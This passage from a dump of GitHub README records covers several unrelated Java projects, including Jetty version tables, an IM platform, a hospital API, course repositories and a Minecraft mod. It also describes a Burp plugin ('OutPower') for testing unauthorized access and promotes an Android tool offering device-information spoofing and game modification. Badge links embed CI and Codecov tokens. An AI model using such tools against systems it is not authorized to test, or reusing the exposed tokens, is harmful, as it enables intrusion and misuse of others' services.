| [11.0.x][1]  | 11      | EE9  | 5.0     | `jakarta.servlet` | No (as of January 2024) [See #10485][4] |
| [10.0.x][2]  | 11      | EE8  | 4.0     | `javax.servlet`   | No (as of January 2024) [See #10485][4] |
| [9.4.x][3]   | 8       | EE7  | 3.1     | `javax.servlet`   | No (as of June 2022) [See #7958][5]     |

[1]: https://github.com/jetty/jetty-examples/tree/11.0.x
[2]: https://github.com/jetty/jetty-examples/tree/10.0.x
[3]: https://github.com/jetty/jetty-examples/tree/9.4.x
[4]: https://github.com/jetty/jetty.project/issues/10485
[5]: https://github.com/jetty/jetty.project/issues/7958
[6]: https://github.com/jetty/jetty-examples/tree/12.0.x
[7]: embedded/README.md
[8]: standalone/README.md
[9]: webapps/README.md",0,1,11,NOASSERTION
Katana-Official/Meta,master,"# Meta Wallet UI

## Commercial Indication
You can use this project freely, and we'd recommend you to contact us for el further sdk support.  
[Join our grupo for el sdk & usage support.](https://t.me/foxiteu), or you can connect me by my email.  
The Metaverse Engine Launcher UI is based on el project Mundo, you can obtain the free and paid SDK by contacting us.  
Our SDK is NOT OPEN SOURCE, you can obtain the constant updates by purchasing our commercial SDK.

## About us

### Our official product

[SlimVXposed](https://www.die.lu)

SlimVXposed is the most efficient app for app twin and app clone, you can see our app on our main site.  
Functionalities: Xposed framework support, GMS (Commercial flavour), game modifying, app clone infinitly, device information spoofing etc......  
SlimVXposed is a powerful Android container, which can open more apps. This project provides a simple UI for you to experience. You can also download the official apk de [Official Web](https://www.die.lu).  
If you are an android developer, you can also customize your own UI by downloading this project source.  
You don't need to pay attention to the technical details that are difficult to understand.  
You can contact me for el further information, we provide the rebranding / app outsourcing etc. services.  
Before you compile this project, please assure that you place your own sdk file to the right place.

[SPatch](http://spatch.die.lu)

Powerful Android / iOS app modifying tool, you can make your plugins y app more integrated.

## Contact Details
Email: 1@die.lu  
Telegram: [https://t.me/foxiteu](https://t.me/foxiteu)

### All APIs Details (Before you create your project)
API Documentation link: [https://mundo.bienvenido.top/](https://mundo.bienvenido.top/)

### Sample code for starters and noobs

#### Launch a sample application
```Java
    MetaActivityManager.launchApp(
        applicationPackageName
    );
```
or
```Java
    MetaActivityManager.launchApp(
	    userPartitionName,
        applicationPackageName
    );
```  

Read more documents on [https://mundo.bienvenido.top/](https://mundo.bienvenido.top/)

### Change logs
#### Jan. 2024
Move the project to the Mundo platform.
#### Oct. 2023
Initial upload mi project.

### Credits
[SHook](https://gitee.com/quitoa/slim-xposed-compat)  
[LSPlant](https://github.com/LSPosed/LSPlant)  
[AnyFile2Byte](https://github.com/OfficialKatana/AnyFile2Byte)  
[GraphScope](https://github.com/alibaba/GraphScope)  
[Il2CppDumper](https://github.com/Perfare/Il2CppDumper)  
[ShadowHook](https://github.com/bytedance/android-inline-hook)  
[dexmaker](https://github.com/linkedin/dexmaker)  
[ByteHook](https://github.com/bytedance/bhook)  

### License
#### GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007  

Copyright (C) 2007 Free Software Foundation, Inc.
<https://fsf.org/>

Everyone is permitted to copy and distribute verbatim copies of this
license document, but changing it is not allowed.",11,12,1,GPL-3.0
lenve/vhr2.0,main,"## vhr2.0 版

此版本使用 SpringBoot3+Vue3 重构 vhr，业务代码变化不大，脚手架上有一些差异，因此这个版本专注于脚手架在搭建时候的变化。

另需注意，相比于 vhr 1.0 版，2.0 引入了 MyBatis Plus，项目模块划分也和 1.0 版有差异。

本版本亦配有付费视频教程，有需要可扫码关注微信公众号后回复vhr查看介绍。

![](https://open.weixin.qq.com/qr/code?username=a_javaboy)
",0,0,1,
jsl1992/JiChat,master,"# 【JiChat】基于Netty打造百万级用户IM平台：探索可扩展和高性能通信的威力

<!--
Travis CI 徽章：
访问 Travis CI，使用 GitHub 账户登录，并启用你的项目的构建。
在仓库的 Travis CI 页面找到 ""Build Status"" 徽章，选择需要的格式，然后将其添加到你的 README 文件中。
Codecov 徽章：

访问 Codecov，使用 GitHub 账户登录，并启用你的项目的代码覆盖率报告。
在仓库的 Codecov 页面找到 ""Badge"" 选项，选择需要的格式，然后将其添加到你的 README 文件中。
Maven中央仓库版本徽章：

访问 Shields.io，选择 ""Maven Central""，输入你的 Maven 仓库坐标（group ID 和 artifact ID），然后生成徽章代码并添加到你的 README 文件中。
许可证信息徽章：

访问 Shields.io，选择 ""License""，输入你的项目的许可证，然后生成徽章代码并添加到你的 README 文件中。
Is It Maintained 徽章：

访问 Is It Maintained，搜索你的项目，获取徽章代码并添加到你的 README 文件中。
-->
[![CircleCI](https://dl.circleci.com/status-badge/img/circleci/CgWndursnfTN85ScJmBdyi/R7S69YhP9B1F39MDmdLyCB/tree/master.svg?style=svg&circle-token=f619bb84e6e68f060795b1c21a25d39a1c1b0cb4)](https://dl.circleci.com/status-badge/redirect/circleci/CgWndursnfTN85ScJmBdyi/R7S69YhP9B1F39MDmdLyCB/tree/master)
[![codecov](https://codecov.io/gh/jsl1992/JiChat/graph/badge.svg?token=NVFGT76HQF)](https://codecov.io/gh/jsl1992/JiChat)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/dc30543fa9844f98bc5fa169c97913d9)](https://app.codacy.com/gh/jsl1992/JiChat/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
![maven](https://img.shields.io/maven-central/v/com.ji.jichat/jichat.svg)
![GitHub License](https://img.shields.io/github/license/jsl1992/JiChat)
[![Average time to resolve an issue](http://isitmaintained.com/badge/resolution/jsl1992/JiChat.svg)](http://isitmaintained.com/project/jsl1992/JiChat ""Average time to resolve an issue"")
[![Percentage of issues still open](http://isitmaintained.com/badge/open/jsl1992/JiChat.svg)](http://isitmaintained.com/project/jsl1992/JiChat ""Percentage of issues still open"")
[![Leaderboard](https://img.shields.io/badge/JiChat-%E6%9F%A5%E7%9C%8B%E8%B4%A1%E7%8C%AE%E6%8E%92%E8%A1%8C%E6%A6%9C-orange)](https://github.com/jsl1992/JiChat)



# 前言
 'JiChat' 的IM系统:不仅支持多客户端登录，还实现了历史消息同步、消息顺序一致性和零消息丢失的特性,同时支持端到端加密会话保护用户隐私。为确保系统的可扩展性，整个架构按照百万级用户流量的标准进行设计，并支持无缝的横向扩展。



# 系统设计
系统采用了分布式架构，基于 Spring Cloud 实现微服务化，服务注册和发现方面使用 Nacos，消息中间件选择 RabbitMQ，持久性数据存储采用 MySQL 数据库，缓存层使用 Redis。在数据访问层面，使用 MyBatis-Plus 简化数据库操作。服务之间通过 OpenFeign 实现远程调用，以提高服务之间的通信效率。为了满足即时通讯需求，引入了 Netty 框架，以实现高性能、实时的消息传递。




# 业务流程
![image](https://github.com/jsl1992/JiChat/assets/34052259/7ccf4c17-59ef-4eff-991f-41c624812791)



## 消息流程
1. 用户A向聊天服务器1发送聊天消息。
2. 聊天服务器1从ID生成器获取消息ID。
3. 聊天服务器1将消息发送到消息同步队列。
4. 消息存储在键值存储中。
5. a.如果用户 B 在线，则消息将转发到用户 B 所在的聊天服务器 2连接的。
5. b. 如果用户 B 离线，则从推送通知 (PN) 服务器发送推送通知。
6. 聊天服务器2将消息转发给用户B。有一个持久的TCP用户 B 和聊天服务器 2 之间的连接。

消息大略流程： 客户端A→服务端a→服务端b→客户端B


## 项目部署
### (1)安装docker和docker-compose，安装组件
请执行doc目录中的docker-compose.yml文件，以安装RabbitMQ、Nacos、MySQL、Redis等组件。如果Nacos安装失败，请确保在MySQL中初始化Nacos所需的nacos-db.sql文件数据。
### (2)启动user-service-app和chat-service-app服务
进行JiChat数据库的初始化，执行jichat_user.sql脚本。然后，修改user-service-app和chat-service-app服务的配置文件，确保连接到正确的RabbitMQ、Nacos、MySQL和Redis地址以及账号信息。最后，启动user-service-app和chat-service-app服务。
### (3)启动chat-client客户端
调用user-service-app的注册账号接口后，修改chat-client的application-dev.yaml文件中的用户信息和连接地址，即可启动客户端。为了方便实现通信，建议在dev和test配置文件中使用不同端口和用户id
### (4)访问地址
    chat-server swagger: http://localhost:18080/chat-api/doc.html#/home
    user-server swagger: http://localhost:18081/user-api/doc.html#/home
    chat-client swagger: http://localhost:9192/doc.html#/home

# 项目业务分析博客
JiChat 博客地址 [https://blog.csdn.net/weixin_42887222/article/details/135910752 ](https://blog.csdn.net/weixin_42887222/article/details/135910752)

# 反馈交流
邮箱: jishenglong92@gmail.com

",0,0,4,MIT
GDSC-Hongik/gdsc-server,develop,,35,30,11,
darkfive2022/OutPower,master,"# OutPower (越权)

* burp插件
* 主要用于测试越权、未授权
* 在xia yue插件的基础上进行二开
* 感谢名单：算命瞎子、darkfive

**********

### 注意
* 默认使用jdk1.8编译
* 旨在于帮助安全测试人员提高日常测试效率，请勿违规使用，后果自负！

**********
### 新增越权测试场景描述
* 灵感来源于日常测试中发现越来越多的公司采用mvc开发模式，比如以下应用场景：</br>
Url：https://www.baidu.com/webui/user/query/123456
而这里的123456便是我们需要越权测试的关键参数，目前只针对于整形参数进行测试，后期会加入测试参数值为字符串的情况，如：BC1231412412
**********
### 插件截图
<img width=""1262"" alt=""image"" src=""https://github.com/darkfive2022/OutPower/assets/136411443/bf32c98c-fb35-4eae-bcc6-78a4df8eeaea"">

",2,0,1,
Jho00/cloud-computing,main,,0,0,1,
MirnaGama/hospital-management-api,master,"# Hospital Management - API Module ![Build Status](https://github.com/MirnaGama/hospital-management-api/actions/workflows/maven.yml/badge.svg)

## About the project
Hospital Management API built in Spring Boot

### Prerequisites:
- Spring Boot 3.2.1 
- JDK 17
- Maven 4.0.0

### Running the application
1. `git clone https://github.com/MirnaGama/hospital-management-api/`
2. `cd hospital-management-api`
3. `mvn clean install`<br>
It will build the jar file in the target folder
4. `mvn spring-boot:run`<br>
It will compile and run the application on default port (8080)

### Running tests
- `mvn test`<br>
It will executes all the tests.

- `mvn -Dtest=packageName.className test`<br>
It will execute only one test class

- `mvn -Dtest=packageName.className#methodName test`<br>
It will run only one test method from one test class

### Features - v1.0
- [X] R1 - Doctor Registration
- [X] R2 - List of Doctors
- [X] R3 - Doctor Update
- [X] R4 - Doctor Exclusion
- [X] R5 - Patient Registration
- [X] R6 - List of Patients
- [X] R7 - Patient Update
- [X] R8 - Patient Exclusion
- [X] R9 - Consultation Scheduling
- [X] R10 - Consultation Cancellation

## API Documentation - /swagger-ui/index.html

### authentication

#### POST - [**/api/auth/register**] - Register a new user

- **Body:**
```
{   
    ""login"" (string, required),  
    ""password"" (string, required), 
}
```

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |

#### POST - [**/api/auth/login**] - Perform the login

- **Body:**
```
{   
    ""login"" (string, required),  
    ""password"" (string, required), 
}
```

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Incorrect credentials_ | 


### doctors

#### POST - [**/api/v1.0/doctors**] - Adds a new doctor

- **Body:**
```
{   
    ""name"" (string, required),  
    ""email"" (string, required),  
    ""crm"" (string, required),  
    ""telephone"" (string, required), 
    ""specialty"" (string, required), 
    ""address"": {   
        ""street"" (string, required),
        ""neighborhood"" (string, required), 
        ""zipCode"" (string, required),  
        ""city"" (string, required),  
        ""state"" (string, required),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional)
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/doctors/{id}**] - Get an existing doctor

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""DOCTOR TEST"",
    ""email"": ""test@gmail.com"",
    ""crm"": ""12456"",
    ""telephone"": ""(81) 99999999"",
    ""specialty"": ""ORTHOPEDICS"",
    ""active"": true,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the doctor who will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/doctors**] - Get a list of doctors

- **Response Body Example:**
```
{
    ""content"": [
        {
            ""name"": ""Test1"",
            ""email"": ""test1@gmail.com"",
            ""crm"": ""123456"",
            ""specialty"": ""ORTHOPEDICS""
        },
        {
            ""name"": ""Test2"",
            ""email"": ""test2@gmail.com"",
            ""crm"": ""789101"",
            ""specialty"": ""ORTHOPEDICS""
        },
        {
            ""name"": ""Test3"",
            ""email"": ""test3@gmail.com"",
            ""crm"": ""112131"",
            ""specialty"": ""ORTHOPEDICS""
        },
    ],
    ""pageable"": {
        ""pageNumber"": 0,
        ""pageSize"": 10,
        ""sort"": {
            ""sorted"": true,
            ""unsorted"": false,
            ""empty"": false
        },
        ""offset"": 0,
        ""paged"": true,
        ""unpaged"": false
    },
    ""totalPages"": 1,
    ""totalElements"": 3,
    ""last"": true,
    ""sort"": {
        ""sorted"": true,
        ""unsorted"": false,
        ""empty"": false
    },
    ""number"": 0,
    ""size"": 10,
    ""first"": true,
    ""numberOfElements"": 3,
    ""empty"": false
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `size` | _Number of records that should be returned_ |
| `sort` | _Sort by object attribute in descending order_ |
| `page` | _Page number_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 


#### PUT - [**/api/v1.0/doctors**] - Updates an existing doctor

- **Body:**
```
{   
    ""id"" (number, required),
    ""name"" (string, optional), 
    ""telephone"" (string, optional),  
    ""address"": {   
        ""street"" (string, optional),
        ""neighborhood"" (string, optional), 
        ""zipcode"" (string, optional),  
        ""city"" (string, optional),  
        ""state"" (string, optional),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional),
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 


#### DELETE - [**/api/v1.0/doctors/{id}**] - Deactivates an existing doctor

- **Response Body Example:**
```
{
    ""id"": 2,
    ""name"": ""DEACTIVATED DOCTOR TEST"",
    ""email"": ""test@gmail.com"",
    ""crm"": ""12456"",
    ""telephone"": ""(81) 99999999"",
    ""specialty"": ""ORTHOPEDICS"",
    ""active"": false,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the doctor who will be deactivated_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

### patients

#### POST - [**/api/v1.0/patients**] - Adds a new patient

- **Body:**
```
{   
    ""name"" (string, required),  
    ""email"" (string, required),  
    ""cpf"" (string, required),  
    ""telephone"" (string, required), 
    ""address"": {   
        ""street"" (string, required),
        ""neighborhood"" (string, required), 
        ""zipCode"" (string, required),  
        ""city"" (string, required),  
        ""state"" (string, required),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional)
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 


#### GET - [**/api/v1.0/patients/{id}**] - Get an existing patient

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""PATIENT TEST"",
    ""email"": ""test@gmail.com"",
    ""cpf"": ""11111111111"",
    ""telephone"": ""(81) 99999999"",
    ""active"": true,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the patient who will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/patients**] - Get a list of patients

- **Response Body Example:**
```
{
    ""content"": [
        {
            ""name"": ""Test1"",
            ""email"": ""test1@gmail.com"",
            ""cpf"": ""123456""
        },
        {
            ""name"": ""Test2"",
            ""email"": ""test2@gmail.com"",
            ""cpf"": ""789101""
        },
        {
            ""name"": ""Test3"",
            ""email"": ""test3@gmail.com"",
            ""cpf"": ""112131""
        },
    ],
    ""pageable"": {
        ""pageNumber"": 0,
        ""pageSize"": 10,
        ""sort"": {
            ""sorted"": true,
            ""unsorted"": false,
            ""empty"": false
        },
        ""offset"": 0,
        ""paged"": true,
        ""unpaged"": false
    },
    ""totalPages"": 1,
    ""totalElements"": 3,
    ""last"": true,
    ""sort"": {
        ""sorted"": true,
        ""unsorted"": false,
        ""empty"": false
    },
    ""number"": 0,
    ""size"": 10,
    ""first"": true,
    ""numberOfElements"": 3,
    ""empty"": false
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `size` | _Number of records that should be returned_ |
| `sort` | _Sort by object attribute in descending order_ |
| `page` | _Page number_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 

#### PUT - [**/api/v1.0/patients**] - Updates an existing patient

- **Body:**
```
{   
    ""id"" (number, required),
    ""name"" (string, optional), 
    ""telephone"" (string, optional),  
    ""address"": {   
        ""street"" (string, optional),
        ""neighborhood"" (string, optional), 
        ""zipcode"" (string, optional),  
        ""city"" (string, optional),  
        ""state"" (string, optional),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional),
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 

#### DELETE - [**/api/v1.0/patients/{id}**] - Deactivates an existing patient

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""DEACTIVATED PATIENT TEST"",
    ""email"": ""test@gmail.com"",
    ""cpf"": ""11111111111"",
    ""telephone"": ""(81) 99999999"",
    ""active"": false,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the patient who will be deactivated_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

### consultations

#### POST - [**/api/v1.0/consultations**] - Adds a new consultation

- **Body:**
```
{   
    ""patientId"" (number, required),  
    ""consultationDate"" (string, required),  
    ""doctorId"" (number, required if _specialty_ field is not filled),
    ""specialty"" (string, required if _doctorId_ field is not filled)
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 
| `404` | _Entity not found_ |

#### GET - [**/api/v1.0/consultations/{id}**] - Get an existing consultation

- **Response Body Example:**
```
{
    ""id"": 1,
    ""consultationDate"": ""22/04/2024 10:34"",
    ""patient"": {...},
    ""doctor"": {...},
    ""canceled"": false,
    ""reasonCancellation: """"
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the consultation that will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### DELETE - [**/api/v1.0/consultations**] - Cancels a scheduled consultation

- **Body:**
```
{   
    ""consultationId"" (number, required),  
    ""reasonCancellation"" (string, required),  
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 
| `404` | _Entity not found_ |
",0,0,12,
DJ-Raven/java-messenger,main,"# Java Messenger

This is a simple messenger app built using Java Swing for the client-side GUI, Node.js for the server-side API, and Socket-IO for real-time communication. The graphical user interface (GUI) is styled using FlatLaf.

**This project is still in development.**

<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-2.png?raw=true"" alt=""sample 2"" width=""400""/>&nbsp;
<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-3.png?raw=true"" alt=""sample 3"" width=""400""/>&nbsp;

## Demo
[Download Demo Test](messenger-client/demo/messenger-test-1.4.0.jar?raw=true)

Run demo with `java -jar messenger-test-<version>.jar` or `double-click` (Requires Java 8 or newer)

### Client libraries used (Java)
| Name | GitHub |
| ------------ | ------------ |
| FlatLaf | https://github.com/JFormDesigner/FlatLaf |
| MiG Layout | https://github.com/mikaelgrev/miglayout |
| REST Assured | https://github.com/rest-assured/rest-assured |
| Socket.IO Java client | https://github.com/socketio/socket.io-client-java |
| JSON-Java | https://github.com/stleary/JSON-java?tab=readme-ov-file |
| JLayer | https://github.com/umjammer/jlayer |
| mp3agic | https://github.com/mpatric/mp3agic |
| Thumbnailator | https://github.com/coobird/thumbnailator |
| Swing Modal Dialog | https://github.com/DJ-Raven/swing-modal-dialog |
### Server libraries used (Nodejs)
| Name | GitHub |
| ------------ | ------------ |
| Express | https://github.com/expressjs/express |
| socket.io | https://github.com/socketio/socket.io |
| jsonwebtoken | https://github.com/auth0/node-jsonwebtoken |
| bcrypt.js | https://github.com/dcodeIO/bcrypt.js |
| BlurHash | https://github.com/woltapp/blurhash/tree/master |
| Multer | https://github.com/expressjs/multer |
| MySQL2 | https://github.com/sidorares/node-mysql2 |
| nodemon `dev`| https://github.com/remy/nodemon |
| and more ... |  |
",0,0,1,MIT
kristiania/PGR112v24,main,"# PGR112 - Våren 2024

> Objektorientert programmering

> Foreleser:
> - `MarcusAlexander.Dahl@kristiania.no`

Link til emnet på Canvas:
- https://kristiania.instructure.com/courses/12156

Slides brukt som en del av undervisningen kan lastes ned fra Canvas.

Opptak gjort av forelesningene legges ut i Canvas-emnet under Panopto.

Om du har spørsmål angående emnet, ta gjerne kontakt!

---

Filstruktur:

```
.
└── PGR112v24/
    ├── code/
    │   ├── examples/
    │   │   └── Inneholder kategoriserte eksempler 
    │   ├── lectures/
    │   │   └── Inneholder kode skrevet i forelesninger
    │   ├── projects/
    │   │   └── Inneholder større prosjekter
    │   ├── solutions/
    │   │   └── Inneholder løsningsforslag
    │   └── tasks/
    │       ├── _*/
    │       │   └── Spesifikke oppgaver som er nummererte
    │       ├── extra/
    │       │   └── Ekstra-oppgaver
    │       └── practice/
    │           └── Oppgaver ment for mengdetrening
    ├── files/
    │   └── Inneholder ressursfiler, her finner du også filer som trengs til oppgaver
    └── student/
        └── <DITT-BRUKERNAVN>/
            └── Her plasserer du dine kodefiler - bruk det til å leke med kode eller oppgaver!
```

Ellers, inne i `code/`-mappen, om du ser en `src/`- eller `code/`-undermappe så er det tiltenkt at denne mappen brukes for å svare på en oppgave.
Disse mappene kan også opprettes selv for å jobbe med oppgaver i mappen `tasks/`.

Om det er noen filer du mener mangler eller du har forslag til endringer, send meg en melding på Canvas eller Mattermost!





",0,0,1,
rocketseat-education/nlw-expert-java,main,,0,0,1,
HuLaSpark/HuLa-Server,master,,0,1,2,Apache-2.0
vesavvo/design_patterns,master,"# Design Patterns

Examples and Assigments for the Design Patterns course. (The lecture slides are in Oma.)

_This material has been made by Vesa Ollikainen._

## Examples and assignments

1. Factory Method. [Examples](markdown/examples/factory_method.md). [Assignments](markdown/assignments/factory_method.md).
2. Abstract Factory. [Examples](markdown/examples/abstract_factory.md). [Assignments](markdown/assignments/abstract_factory.md).
3. Composite. [Examples](markdown/examples/composite.md). [Assignments](markdown/assignments/composite.md).
4. Observer [Examples](markdown/examples/observer.md). [Assignments](markdown/assignments/observer.md).
5. Singleton. [Examples](markdown/examples/singleton.md). [Assignments](markdown/assignments/singleton.md).
6. Decorator. [Examples](markdown/examples/decorator.md). [Assignments](markdown/assignments/decorator.md).
7. State. [Examples](markdown/examples/state.md). [Assignments](markdown/assignments/state.md).
8. Template Method. [Examples](markdown/examples/template_method.md). [Assignments](markdown/assignments/template_method.md).
9. Strategy. [Examples](markdown/examples/strategy.md). [Assignments](markdown/assignments/strategy.md).
10. Chain of Responsibility. [Examples](markdown/examples/chain_of_responsibility.md). [Assignments](markdown/assignments/chain_of_responsibility.md).
11. Memento. [Examples](markdown/examples/memento.md). [Assignments](markdown/assignments/memento.md).
12. Proxy. [Examples](markdown/examples/proxy.md). [Assignments](markdown/assignments/proxy.md).
13. Visitor. [Examples](markdown/examples/visitor.md). [Assignments](markdown/assignments/visitor.md).
14. Builder. [Examples](markdown/examples/builder.md). [Assignments](markdown/assignments/builder.md).
15. Adapter. [Examples](markdown/examples/adapter.md). [Assignments](markdown/assignments/adapter.md).
16. Bridge. [Examples](markdown/examples/bridge.md). [Assignments](markdown/assignments/bridge.md).
17. Flyweight. [Examples](markdown/examples/flyweight.md). [Assignments](markdown/assignments/flyweight.md).
18. Prototype. [Examples](markdown/examples/prototype.md). [Assignments](markdown/assignments/prototype.md).
19. Mediator. [Examples](markdown/examples/mediator.md). [Assignments](markdown/assignments/mediator.md).
20. Iterator. [Examples](markdown/examples/iterator.md). [Assignments](markdown/assignments/iterator.md).
21. Facade. [Examples](markdown/examples/facade.md). [Assignments](markdown/assignments/facade.md).
22. Command. [Examples](markdown/examples/command.md). [Assignments](markdown/assignments/command.md).

---
_This learning material has been produced with assistance from OpenAI's ChatGPT-4 and GitHub Copilot. These large language models have provided suggestions and solutions that have assisted the author in producing and supplementing the material. While their contribution has been significant, the final responsibility for the content and its correctness resides with the author._",0,0,1,
MehVahdJukaar/polytone,1.21.3,"## Polytone
[![polytone_banner](https://github.com/MehVahdJukaar/polytone/assets/24719182/7c5bb84a-5aa8-4883-9e23-c27e8ce60c22)](https://legacy.curseforge.com/minecraft/mc-mods/polytone)

Polytone is a powerful client-side customization mod which allows tweaking various aspect with the game via Resource Packs

These include:

* Customize Map Colors 🗺️
* Customize Dye Colors 🖌️
* Change Block Sounds 🎵
* Custom Colormaps 🎨
* Block Offset Type 📐
* Customize Biome Effects 🌊

For some things the mod also offers backwards compatibility with the system previously offered by Optifine (color.properties file), allowing said features from existing packs to work aswell

The mod is designed to be fast and as lightweight as possible while keeping the most customization it can. 
Not only does it offer a replacement for color.properties system but also offer way, way more features and customization options that were previously not available.

The mod can work both in VANILLA and in MODDED environment, working flawlessly with ANY Biome, Particle, Blocks and so on, unlike what previous mods did.

The mod is meant to be used by anyone


For extensive documentation follow the mod Wiki here

https://github.com/MehVahdJukaar/polytone/wiki/Custom-Colors

https://github.com/MehVahdJukaar/polytone/wiki/Custom-Block-Properties

https://github.com/MehVahdJukaar/polytone/wiki/Custom-Biome-Effects
",0,21,8,NOASSERTION
copycats-plus/copycats,multiloader,,9,54,21,NOASSERTION
stuetzlec/merrimack_cs_examples,main,"# merrimack_cs_examples
Coding examples used in Merrimack College Computer Science courses
",0,0,1,GPL-3.0
Yanyutin753/refresh-gpt-chat,main,"# refresh-gpt-chat

![Docker Image Size (tag)](https://img.shields.io/docker/image-size/yangclivia/refresh-gpt-chat/latest)![Docker Pulls](https://img.shields.io/docker/pulls/yangclivia/refresh-gpt-chat)[![GitHub Repo stars](https://img.shields.io/github/stars/Yanyutin753/refresh-gpt-chat?style=social)](https://github.com/Yanyutin753/refresh-gpt-chat/stargazers)

### 不许白嫖，请给我免费的star⭐吧，十分感谢！

## 简介

